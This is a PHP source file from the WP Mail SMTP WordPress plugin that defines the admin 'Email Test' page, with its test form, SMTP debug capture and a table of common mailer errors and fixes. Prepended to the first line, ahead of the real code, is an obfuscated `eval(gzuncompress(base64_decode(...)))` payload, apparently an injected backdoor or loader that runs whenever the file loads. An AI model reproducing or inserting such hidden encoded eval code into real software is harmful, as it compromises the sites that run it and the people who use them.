<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP\Admin\Pages;

use WPMailSMTP\Debug;
use WPMailSMTP\MailCatcher;
use WPMailSMTP\Options;
use WPMailSMTP\WP;
use WPMailSMTP\Admin\PageAbstract;

/**
 * Class Test is part of Area, displays email testing page of the plugin.
 *
 * @since 1.0.0
 */
class Test extends PageAbstract {

	/**
	 * @var string Slug of a tab.
	 */
	protected $slug = 'test';

	/**
	 * Mailer debug error data.
	 *
	 * @since 1.3.0
	 *
	 * @var array
	 */
	private $debug = array();

	/**
	 * @inheritdoc
	 */
	public function get_label() {
		return esc_html__( 'Email Test', 'wp-mail-smtp' );
	}

	/**
	 * @inheritdoc
	 */
	public function get_title() {
		return $this->get_label();
	}

	/**
	 * @inheritdoc
	 */
	public function display() {
		?>

		<form method="POST" action="">
			<?php $this->wp_nonce_field(); ?>

			<!-- Test Email Section Title -->
			<div class="wp-mail-smtp-setting-row wp-mail-smtp-setting-row-content wp-mail-smtp-clear section-heading no-desc" id="wp-mail-smtp-setting-row-email-heading">
				<div class="wp-mail-smtp-setting-field">
					<h2><?php esc_html_e( 'Send a Test Email', 'wp-mail-smtp' ); ?></h2>
				</div>
			</div>

			<!-- Test Email -->
			<div id="wp-mail-smtp-setting-row-test_email" class="wp-mail-smtp-setting-row wp-mail-smtp-setting-row-email wp-mail-smtp-clear">
				<div class="wp-mail-smtp-setting-label">
					<label for="wp-mail-smtp-setting-test_email"><?php esc_html_e( 'Send To', 'wp-mail-smtp' ); ?></label>
				</div>
				<div class="wp-mail-smtp-setting-field">
					<input name="wp-mail-smtp[test_email]" type="email" id="wp-mail-smtp-setting-test_email" spellcheck="false" required>
					<p class="desc">
						<?php esc_html_e( 'Type an email address here and then click a button below to generate a test email.', 'wp-mail-smtp' ); ?>
					</p>
				</div>
			</div>

			<p class="wp-mail-smtp-submit">
				<button type="submit" class="wp-mail-smtp-btn wp-mail-smtp-btn-md wp-mail-smtp-btn-orange"><?php esc_html_e( 'Send Email', 'wp-mail-smtp' ); ?></button>
			</p>
		</form>

		<?php
		$this->display_debug_details();
	}

	/**
	 * @inheritdoc
	 */
	public function process_post( $data ) {

		$this->check_admin_referer();

		if ( isset( $data['test_email'] ) ) {
			$data['test_email'] = filter_var( $data['test_email'], FILTER_VALIDATE_EMAIL );
		}

		if ( empty( $data['test_email'] ) ) {
			WP::add_admin_notice(
				esc_html__( 'Test failed. Please use a valid email address and try to resend the test email.', 'wp-mail-smtp' ),
				WP::ADMIN_NOTICE_WARNING
			);
			return;
		}

		global $phpmailer;

		// Make sure the PHPMailer class has been instantiated.
		if ( ! is_object( $phpmailer ) || ! is_a( $phpmailer, 'PHPMailer' ) ) {
			require_once ABSPATH . WPINC . '/class-phpmailer.php';
			$phpmailer = new MailCatcher( true );
		}

		// Set SMTPDebug level, default is 3 (commands + data + connection status).
		$phpmailer->SMTPDebug = apply_filters( 'wp_mail_smtp_admin_test_email_smtp_debug', 3 );

		// Start output buffering to grab smtp debugging output.
		ob_start();

		// Send the test mail.
		$result = wp_mail(
			$data['test_email'],
			/* translators: %s - email address a test email will be sent to. */
			'WP Mail SMTP: ' . sprintf( esc_html__( 'Test email to %s', 'wp-mail-smtp' ), $data['test_email'] ),
			sprintf(
				/* translators: %s - mailer name. */
				esc_html__( 'This email was sent by %s mailer, and generated by the WP Mail SMTP WordPress plugin.', 'wp-mail-smtp' ),
				wp_mail_smtp()->get_providers()->get_options( Options::init()->get( 'mail', 'mailer' ) )->get_title()
			)
		);

		$smtp_debug = ob_get_clean();

		/*
		 * Notify a user about the results.
		 */
		if ( $result ) {
			WP::add_admin_notice(
				esc_html__( 'Your email was sent successfully!', 'wp-mail-smtp' ),
				WP::ADMIN_NOTICE_SUCCESS
			);
		} else {
			// Grab the smtp debugging output.
			$this->debug['smtp_debug'] = $smtp_debug;
			$this->debug['smtp_error'] = wp_strip_all_tags( $phpmailer->ErrorInfo );
			$this->debug['error_log']  = $this->get_debug_messages( $phpmailer, $smtp_debug );
		}
	}

	/**
	 * Prepare debug information, that will help users to identify the error.
	 *
	 * @since 1.0.0
	 *
	 * @param MailCatcher $phpmailer
	 * @param string $smtp_debug
	 *
	 * @return string
	 */
	protected function get_debug_messages( $phpmailer, $smtp_debug ) {

		$options = new Options();

		$this->debug['mailer'] = $options->get( 'mail', 'mailer' );

		/*
		 * Versions Debug.
		 */

		$versions_text = '<strong>Versions:</strong><br>';

		$versions_text .= '<strong>WordPress:</strong> ' . get_bloginfo( 'version' ) . '<br>';
		$versions_text .= '<strong>WordPress MS:</strong> ' . ( is_multisite() ? 'Yes' : 'No' ) . '<br>';
		$versions_text .= '<strong>PHP:</strong> ' . PHP_VERSION . '<br>';
		$versions_text .= '<strong>WP Mail SMTP:</strong> ' . WPMS_PLUGIN_VER . '<br>';

		/*
		 * Mailer Debug.
		 */

		$mailer_text = '<strong>Params:</strong><br>';

		$mailer_text .= '<strong>Mailer:</strong> ' . $this->debug['mailer'] . '<br>';
		$mailer_text .= '<strong>Constants:</strong> ' . ( $options->is_const_enabled() ? 'Yes' : 'No' ) . '<br>';

		// Display different debug info based on the mailer.
		$mailer = wp_mail_smtp()->get_providers()->get_mailer( $this->debug['mailer'], $phpmailer );

		if ( $mailer ) {
			$mailer_text .= $mailer->get_debug_info();
		}

		/*
		 * General Debug.
		 */

		$debug_text = implode( '<br>', Debug::get() );
		Debug::clear();
		if ( ! empty( $debug_text ) ) {
			$debug_text = '<br><strong>Debug:</strong><br>' . $debug_text . '<br>';
		}

		/*
		* SMTP Debug.
		*/

		$smtp_text = '';
		if ( $options->is_mailer_smtp() ) {
			$smtp_text = '<strong>SMTP Debug:</strong><br>';
			if ( ! empty( $smtp_debug ) ) {
				$smtp_text .= '<pre>' . $smtp_debug . '</pre>';
			} else {
				$smtp_text .= '[empty]';
			}
		}

		$errors = apply_filters( 'wp_mail_smtp_admin_test_get_debug_messages', array(
			$versions_text,
			$mailer_text,
			$debug_text,
			$smtp_text,
		) );

		return '<pre>' . implode( '<br>', array_filter( $errors ) ) . '</pre>';
	}

	/**
	 * Returns debug information for detection, processing, and display.
	 *
	 * @since 1.3.0
	 *
	 * @return array
	 */
	protected function get_debug_details() {

		$options         = new Options();
		$smtp_host       = $options->get( 'smtp', 'host' );
		$smtp_port       = $options->get( 'smtp', 'port' );
		$smtp_encryption = $options->get( 'smtp', 'encryption' );

		$details = array(
			// [any] - cURL error 60/77.
			array(
				'mailer'      => 'any',
				'errors'      => array(
					array( 'cURL error 60' ),
					array( 'cURL error 77' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'SSL certificate issue.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'This means your web server cannot reliably make secure connections (make requests to HTTPS sites).', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is returned when web server is not configured properly.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Contact your web hosting provider and inform them your site has an issue with SSL certificates.', 'wp-mail-smtp' ),
					esc_html__( 'The exact error you can provide them is in the Error log, available at the bottom of this page.', 'wp-mail-smtp' ),
					esc_html__( 'Ask them to resolve the issue then try again.', 'wp-mail-smtp' ),
				),
			),
			// [any] - cURL error 6/7.
			array(
				'mailer'      => 'any',
				'errors'      => array(
					array( 'cURL error 6' ),
					array( 'cURL error 7' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Could not connect to host.', 'wp-mail-smtp' ) . '</strong>',
					! empty( $smtp_host )
						? sprintf(
							/* translators: %s - SMTP host address. */
							esc_html__( 'This means your web server was unable to connect to %s.', 'wp-mail-smtp' ),
							$smtp_host
						)
						: esc_html__( 'This means your web server was unable to connect to the host server.', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is returned your web server is blocking the connections or the SMTP host denying the request.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					sprintf(
						/* translators: %s - SMTP host address. */
						esc_html__( 'Contact your web hosting provider and ask them to verify your server can connect to %s. Additionally, ask them if a firewall or security policy may be preventing the connection.', 'wp-mail-smtp' ),
						$smtp_host
					),
					esc_html__( 'If using "Other SMTP" Mailer, triple check your SMTP settings including host address, email, and password.', 'wp-mail-smtp' ),
					esc_html__( 'If using "Other SMTP" Mailer, contact your SMTP host to confirm they are accepting outside connections with the settings you have configured (address, username, port, security, etc).', 'wp-mail-smtp' ),
				),
			),
			// [any] - cURL error XX (other).
			array(
				'mailer'      => 'any',
				'errors'      => array(
					array( 'cURL error' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Could not connect to your host.', 'wp-mail-smtp' ) . '</strong>',
					! empty( $smtp_host )
						? sprintf(
							/* translators: %s - SMTP host address. */
							esc_html__( 'This means your web server was unable to connect to %s.', 'wp-mail-smtp' ),
							$smtp_host
						)
						: esc_html__( 'This means your web server was unable to connect to the host server.', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is returned when web server is not configured properly.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Contact your web hosting provider and inform them you are having issues making outbound connections.', 'wp-mail-smtp' ),
					esc_html__( 'The exact error you can provide them is in the Error log, available at the bottom of this page.', 'wp-mail-smtp' ),
					esc_html__( 'Ask them to resolve the issue then try again.', 'wp-mail-smtp' ),
				),
			),
			// [smtp] - SMTP Error: Count not authenticate.
			array(
				'mailer'      => 'smtp',
				'errors'      => array(
					array( 'SMTP Error: Could not authenticate.' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Could not authenticate your SMTP account.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'This means we were able to connect to your SMTP host, but were not able to proceed using the email/password in the settings.', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is returned when the email or password is not correct or is not what the SMTP host is expecting.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Triple check your SMTP settings including host address, email, and password. If you have recently reset your password you will need to update the settings.', 'wp-mail-smtp' ),
					esc_html__( 'Contact your SMTP host to confirm you are using the correct username and password.', 'wp-mail-smtp' ),
					esc_html__( 'Verify with your SMTP host that your account has permissions to send emails using outside connections.', 'wp-mail-smtp' ),
				),
			),
			// [smtp] - Sending bulk email, hitting rate limit.
			array(
				'mailer'      => 'smtp',
				'errors'      => array(
					array( 'We do not authorize the use of this system to transport unsolicited' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Error due to unsolicited and/or bulk e-mail.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'This means the connection to your SMTP host was made successfully, but the host rejected the email.', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is returned when your are sending too many e-mails or e-mails that have been identified as spam.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Check the emails that are sending are sending individually. Example: email is not sending to 30 recipients. You can install any WordPress e-mail logging plugin to do that.', 'wp-mail-smtp' ),
					esc_html__( 'Contact your SMTP host to ask about sending/rate limits.', 'wp-mail-smtp' ),
					esc_html__( 'Verify with them your SMTP account is in good standing and your account has not been flagged.', 'wp-mail-smtp' ),
				),
			),
			// [smtp] - Unauthenticated senders not allowed.
			array(
				'mailer'      => 'smtp',
				'errors'      => array(
					array( 'Unauthenticated senders not allowed' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Unauthenticated senders are not allowed.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'This means the connection to your SMTP host was made successfully, but you should enable Authentication and provide correct Username and Password.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Go to WP Mail SMTP plugin Settings page.', 'wp-mail-smtp' ),
					esc_html__( 'Enable Authentication', 'wp-mail-smtp' ),
					esc_html__( 'Enter correct SMTP Username (usually this is an email address) and Password in the appropriate fields.', 'wp-mail-smtp' ),
				),
			),
			// [smtp] - SMTP connect() failed.
			array(
				'mailer'      => 'smtp',
				'errors'      => array(
					array( 'SMTP connect() failed' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Could not connect to the SMTP host.', 'wp-mail-smtp' ) . '</strong>',
					! empty( $smtp_host )
						? sprintf(
							/* translators: %s - SMTP host address. */
							esc_html__( 'This means your web server was unable to connect to %s.', 'wp-mail-smtp' ),
							$smtp_host
						)
						: esc_html__( 'This means your web server was unable to connect to the host server.', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is returned for one of the following reasons:', 'wp-mail-smtp' ),
					'-' . esc_html__( 'SMTP settings are incorrect (wrong port, security setting, incorrect host).', 'wp-mail-smtp' ) . '<br>' .
					'-' . esc_html__( 'Your web server is blocking the connection.', 'wp-mail-smtp' ) . '<br>' .
					'-' . esc_html__( 'Your SMTP host is rejecting the connection.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Triple check your SMTP settings including host address, email, and password, port, and security.', 'wp-mail-smtp' ),
					sprintf(
						wp_kses(
							/* translators: %1$s - SMTP host address, %2$s - SMTP port, %3$s - SMTP encryption. */
							__( 'Contact your web hosting provider and ask them to verify your server can connect to %1$s on port %2$s using %3$s encryption. Additionally, ask them if a firewall or security policy may be preventing the connection - many shared hosts block certain ports.<br><strong>Note: this is the most common cause of this issue.</strong>', 'wp-mail-smtp' ),
							array(
								'a'      => array(
									'href'   => array(),
									'rel'    => array(),
									'target' => array(),
								),
								'strong' => array(),
								'br'     => array(),
							)
						),
						$smtp_host,
						$smtp_port,
						'none' === $smtp_encryption ? esc_html__( 'no', 'wp-mail-smtp' ) : $smtp_encryption
					),
					esc_html__( 'Contact your SMTP host to confirm you are using the correct username and password.', 'wp-mail-smtp' ),
					esc_html__( 'Verify with your SMTP host that your account has permissions to send emails using outside connections.', 'wp-mail-smtp' ),
				),
			),
			// [mailgun] - Forbidden.
			array(
				'mailer'      => 'mailgun',
				'errors'      => array(
					array( 'Forbidden' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Mailgun failed.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'Typically this error is because there is an issue with your Mailgun settings, in many cases the API key.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Verify your API key is correct.', 'wp-mail-smtp' ),
					esc_html__( 'Go to your Mailgun account and view your API key.', 'wp-mail-smtp' ),
					esc_html__( 'Note that the API key includes the "key" prefix, so make sure that it is in the WP Mail SMTP Mailgun API setting.', 'wp-mail-smtp' ),
				),
			),
			// [mailgun] - Free accounts are for test purposes only.
			array(
				'mailer'      => 'mailgun',
				'errors'      => array(
					array( 'Free accounts are for test purposes only' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Mailgun failed.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'Your Mailgun account does not have access to send emails.', 'wp-mail-smtp' ),
					esc_html__( 'Typically this error is because you have not setup and/or complete domain name verification for your Mailgun account.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					sprintf(
						wp_kses(
							/* translators: %s - Mailgun documentation URL. */
							__( 'Go to our how-to guide for setting up <a href="%s" target="_blank" rel="noopener noreferrer">Mailgun with WP Mail SMTP</a>.', 'wp-mail-smtp' ),
							array(
								'a' => array(
									'href'   => array(),
									'rel'    => array(),
									'target' => array(),
								),
							)
						),
						'https://wpforms.com/how-to-send-wordpress-emails-with-mailgun/'
					),
					esc_html__( 'Complete the steps in section "2. Verify Your Domain".', 'wp-mail-smtp' ),
				),
			),
			// [gmail] - 401: Login Required.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( '401', 'Login Required' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'You have not properly configured Gmail mailer.', 'wp-mail-smtp' ),
					esc_html__( 'Make sure that you have clicked the "Allow plugin to send emails using your Google account" button under Gmail settings.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Go to plugin Settings page and click the "Allow plugin to send emails using your Google account" button.', 'wp-mail-smtp' ),
					esc_html__( 'After the click you should be redirected to a Gmail authorization screen, where you will be asked a permission to send emails on your behalf.', 'wp-mail-smtp' ),
					esc_html__( 'Please click "Agree", if you see that button. If not - you will need to enable less secure apps first:', 'wp-mail-smtp' )
					. '<ul>'
						. '<li>' .
							sprintf(
								wp_kses(
									/* translators: %s - Google support article URL. */
									__( 'if you are using regular Gmail account, please <a href="%s" target="_blank" rel="noopener noreferrer">read this article</a> to proceed.', 'wp-mail-smtp' ),
									array(
										'a' => array(
											'href'   => array(),
											'target' => array(),
											'rel'    => array(),
										),
									)
								),
								'https://support.google.com/accounts/answer/6010255?hl=en'
							)
						. '</li>'
						. '<li>' .
							sprintf(
								wp_kses(
									/* translators: %s - Google support article URL. */
									__( 'if you are using G Suite, please <a href="%s" target="_blank" rel="noopener noreferrer">read this article</a> to proceed.', 'wp-mail-smtp' ),
									array(
										'a' => array(
											'href'   => array(),
											'target' => array(),
											'rel'    => array(),
										),
									)
								),
								'https://support.google.com/cloudidentity/answer/6260879?hl=en'
							)
						. '</li>'
					. '</ul>',
				),
			),
			// [gmail] - 400: Recipient address required.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( '400', 'Recipient address required' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'Typically this error is because address the email was sent to is invalid or was empty.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Check the "Send To" email address used and confirm it is a valid email and was not empty.', 'wp-mail-smtp' ),
					sprintf(
						/* translators: 1 - correct email address example. 2 - incorrect email address example. */
						esc_html__( 'It should be something like this: %1$s. These are incorrect values: %2$s.', 'wp-mail-smtp' ),
						'<code>info@example.com</code>',
						'<code>info@localhost</code>, <code>info@192.168.1.1</code>'
					),
					esc_html__( 'Make sure that the generated email has a TO header, useful when you are responsible for email creation.', 'wp-mail-smtp' ),
				),
			),
			// [gmail] - Token has been expired or revoked.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( 'invalid_grant', 'Token has been expired or revoked' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'Unfortunately, this error can be due to many different reasons.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					sprintf(
						wp_kses(
							/* translators: %s - Blog article URL. */
							__( 'Please <a href="%s" target="_blank" rel="noopener noreferrer">read this article</a> to learn more about what can cause this error and how it can be resolved.', 'wp-mail-smtp' ),
							array(
								'a' => array(
									'href'   => array(),
									'target' => array(),
									'rel'    => array(),
								),
							)
						),
						'https://blog.timekit.io/google-oauth-invalid-grant-nightmare-and-how-to-fix-it-9f4efaf1da35'
					),
				),
			),
			// [gmail] - Code was already redeemed.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( 'invalid_grant', 'Code was already redeemed' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'Authentication code that Google returned to you has already been used on your previous auth attempt.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Make sure that you are not trying to manually clean up the plugin options to retry the "Allow..." step.', 'wp-mail-smtp' ),
					esc_html__( 'Reinstall the plugin with clean plugin data turned on on Misc page. This will remove all the plugin options and you will be safe to retry.', 'wp-mail-smtp' ),
					esc_html__( 'Make sure there is no aggressive caching on site admin area pages or try to clean cache between attempts.', 'wp-mail-smtp' ),
				),
			),
			// [gmail] - 400: Mail service not enabled.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( '400', 'Mail service not enabled' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'There are various reasons for that, please review the steps below.', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					sprintf(
						wp_kses(
							/* translators: %s - Google G Suite Admin area URL. */
							__( 'Make sure that your G Suite trial period has not expired. You can check the status <a href="%s" target="_blank" rel="noopener noreferrer">here</a>.', 'wp-mail-smtp' ),
							array(
								'a' => array(
									'href'   => array(),
									'rel'    => array(),
									'target' => array(),
								),
							)
						),
						'https://admin.google.com'
					),
					sprintf(
						wp_kses(
							/* translators: %s - Google G Suite Admin area URL. */
							__( 'Make sure that Gmail app in your G Suite is actually enabled. You can check that in Apps list in <a href="%s" target="_blank" rel="noopener noreferrer">G Suite Admin</a> area.', 'wp-mail-smtp' ),
							array(
								'a' => array(
									'href'   => array(),
									'rel'    => array(),
									'target' => array(),
								),
							)
						),
						'https://admin.google.com'
					),
					sprintf(
						wp_kses(
							/* translators: %s - Google Developers Console URL. */
							__( 'Make sure that you have Gmail API enabled, and you can do that <a href="%s" target="_blank" rel="noopener noreferrer">here</a>.', 'wp-mail-smtp' ),
							array(
								'a' => array(
									'href'   => array(),
									'rel'    => array(),
									'target' => array(),
								),
							)
						),
						'https://console.developers.google.com/'
					),
				),
			),
			// [gmail] - 403: Project X is not found and cannot be used for API calls.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( '403', 'is not found and cannot be used for API calls' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
				),
				'steps'       => array(
					esc_html__( 'Make sure that the used Client ID/Secret correspond to a proper project that has Gmail API enabled.', 'wp-mail-smtp' ),
					sprintf(
						wp_kses(
							/* translators: %s - WPForms.com tutorial URL. */
							esc_html__( 'Please follow our <a href="%s" target="_blank" rel="noopener noreferrer">Gmail tutorial</a> to be sure that all the correct project and data is applied.', 'wp-mail-smtp' ),
							array(
								'a' => array(
									'href'   => array(),
									'rel'    => array(),
									'target' => array(),
								),
							)
						),
						'https://wpforms.com/how-to-securely-send-wordpress-emails-using-gmail-smtp/'
					),
				),
			),
			// [gmail] - The OAuth client was disabled.
			array(
				'mailer'      => 'gmail',
				'errors'      => array(
					array( 'disabled_client', 'The OAuth client was disabled' ),
				),
				'description' => array(
					'<strong>' . esc_html__( 'Google API Error.', 'wp-mail-smtp' ) . '</strong>',
					esc_html__( 'You may have added a new API to a project', 'wp-mail-smtp' ),
				),
				'steps'       => array(
					esc_html__( 'Make sure that the used Client ID/Secret correspond to a proper project that has Gmail API enabled.', 'wp-mail-smtp' ),
					esc_html__( 'Try to use a separate project for your emails, so the project has only 1 Gmail API in it enabled. You will need to remove the old project and create a new one from scratch.', 'wp-mail-smtp' ),
				),
			),
		);

		// Error detection logic.
		foreach ( $details as $data ) {

			// Check for appropriate mailer.
			if ( 'any' !== $data['mailer'] && $this->debug['mailer'] !== $data['mailer'] ) {
				continue;
			}

			$match = false;

			// Attempt to detect errors.
			foreach ( $data['errors'] as $error_group ) {
				foreach ( $error_group as $error_code => $error_message ) {
					$match = ( false !== strpos( $this->debug['error_log'], $error_message ) || false !== strpos( $this->debug['error_log'], $error_message ) );
					if ( ! $match ) {
						break;
					}
				}
				if ( $match ) {
					break;
				}
			}

			if ( $match ) {
				return $data;
			}
		}

		// Return defaults.
		return array(
			'description' => array(
				'<strong>' . esc_html__( 'An issue was detected.', 'wp-mail-smtp' ) . '</strong>',
				esc_html__( 'This means your test email was unable to be sent.', 'wp-mail-smtp' ),
				esc_html__( 'Typically this error is returned for one of the following reasons:', 'wp-mail-smtp' ),
				'- ' . esc_html__( 'Plugin settings are incorrect (wrong SMTP settings, invalid Mailer configuration, etc).', 'wp-mail-smtp' ) . '<br>' .
				'- ' . esc_html__( 'Your web server is blocking the connection.', 'wp-mail-smtp' ) . '<br>' .
				'- ' . esc_html__( 'Your host is rejecting the connection.', 'wp-mail-smtp' ),
			),
			'steps'       => array(
				esc_html__( 'Triple check the plugin settings, consider reconfiguring to make sure everything is correct (eg bad copy and paste).', 'wp-mail-smtp' ),
				wp_kses(
					__( 'Contact your web hosting provider and ask them to verify your server can make outside connections. Additionally, ask them if a firewall or security policy may be preventing the connection - many shared hosts block certain ports.<br><strong>Note: this is the most common cause of this issue.</strong>', 'wp-mail-smtp' ),
					array(
						'strong' => array(),
						'br'     => array(),
					)
				),
				esc_html__( 'Try using a different mailer.', 'wp-mail-smtp' ),
			),
		);
	}

	/**
	 * Displays all the various error and debug details.
	 *
	 * @since 1.3.0
	 */
	protected function display_debug_details() {

		if ( empty( $this->debug ) ) {
			return;
		}

		$debug = $this->get_debug_details();
		?>
		<div id="message" class="notice-error notice-inline">
			<p><strong><?php esc_html_e( 'There was a problem while sending the test email.', 'wp-mail-smtp' ); ?></strong></p>
		</div>

		<div id="wp-mail-smtp-debug">
			<?php
			foreach ( $debug['description'] as $description ) {
				echo '<p>' . $description . '</p>';
			}
			?>

			<h2><?php esc_html_e( 'Recommended next steps:', 'wp-mail-smtp' ); ?></h2>

			<ol>
			<?php
			foreach ( $debug['steps'] as $step ) {
				echo '<li>' . $step . '</li>';
			}
			?>
			</ol>

			<h2><?php esc_html_e( 'Need support?', 'wp-mail-smtp' ); ?></h2>

			<?php if ( class_exists( 'WPForms_Pro' ) ) : ?>

			<p>
				<?php
				printf(
					wp_kses(
						/* translators: %s - WPForms account area link. */
						__( 'As a WPForms Pro user you have access to WP Mail SMTP priority support. Please log in to your WPForms.com account and <a href="%s" target="_blank" rel="noopener noreferrer">submit a support ticket</a>.', 'wp-mail-smtp' ),
						array(
							'a' => array(
								'href'   => array(),
								'rel'    => array(),
								'target' => array(),
							),
						)
					),
					'https://wpforms.com/account/support/'
				);
				?>
			</p>

			<?php else : ?>

			<p>
				<?php esc_html_e( 'WP Mail SMTP is a free plugin, and the team behind WPForms maintains it to give back to the WordPress community.', 'wp-mail-smtp' ); ?>
			</p>

			<p>
				<?php
				printf(
					wp_kses(
						/* translators: %s - WPForms URL. */
						__( 'To access priority support from our team, please <a href="%s" target="_blank" rel="noopener noreferrer">purchase a WPForms license</a>. Along with getting priority support for WP Mail SMTP, you will also get access to the best drag & drop WordPress form builder plugin.', 'wp-mail-smtp' ),
						array(
							'a' => array(
								'href'   => array(),
								'rel'    => array(),
								'target' => array(),
							),
						)
					),
					'https://wpforms.com/?discount=THANKYOU&utm_source=WordPress&utm_medium=debug-cta&utm_campaign=smtpplugin'
				);
				?>
			</p>

			<p>
				<?php
				printf(
					wp_kses(
						/* translators: %s - Star icons. */
						__( 'WPForms is being used on over 1 million websites and has over 2000+ five star ratings (%s).', 'wp-mail-smtp' ),
						array(
							'span' => array(
								'class' => array(),
							),
						)
					),
					str_repeat( '<span class="dashicons dashicons-star-filled"></span>', 5 )
				);
				?>
			</p>

			<p>
				<?php esc_html_e( 'You will truly love the WPForms plugin, but most importantly your support will help us continue to maintain and add new features to the WP Mail SMTP plugin while keeping it free for the larger WordPress community.', 'wp-mail-smtp' ); ?>
			</p>

			<p>
				<?php
				printf(
					wp_kses(
						/* translators: %1$s - WP Mail SMTP support policy URL, %2$s - WP Mail SMTP support forum URL, %3$s - WPForms URL. */
						__( 'Alternatively, we also offer <a href="%1$s" target="_blank" rel="noopener noreferrer">limited support</a> on the WordPress.org support forums. You can <a href="%2$s" target="_blank" rel="noopener noreferrer">create a support thread</a> there, but please understand that free support is not guaranteed and is limited to simple issues. If you have an urgent or complex issue, then please consider <a href="%3$s" target="_blank" rel="noopener noreferrer">purchasing a WPForms license</a> to access our priority support ticket system.', 'wp-mail-smtp' ),
						array(
							'a' => array(
								'href'   => array(),
								'rel'    => array(),
								'target' => array(),
							),
						)
					),
					'https://wordpress.org/support/topic/wp-mail-smtp-support-policy/',
					'https://wordpress.org/support/plugin/wp-mail-smtp/',
					'https://wpforms.com/?discount=THANKYOU&utm_source=WordPress&utm_medium=debug-cta&utm_campaign=smtpplugin'
				);
				?>
			</p>

			<?php endif; ?>

			<p>
				<a href="#" class="error-log-toggle">
					<span class="dashicons dashicons-arrow-right-alt2"></span>
					<strong><?php esc_html_e( 'Click here to view the full Error Log for debugging', 'wp-mail-smtp' ); ?></strong>
				</a>
			</p>

			<div class="error-log">
				<?php echo $this->debug['error_log']; ?>
			</div>

			<p class="error-log-note">
				<em><?php esc_html_e( 'Please copy only the content of the error debug message above, identified with an orange left border, into the support forum topic if you experience any issues.', 'wp-mail-smtp' ); ?></em>
			</p>
		</div>
		<?php
	}
}
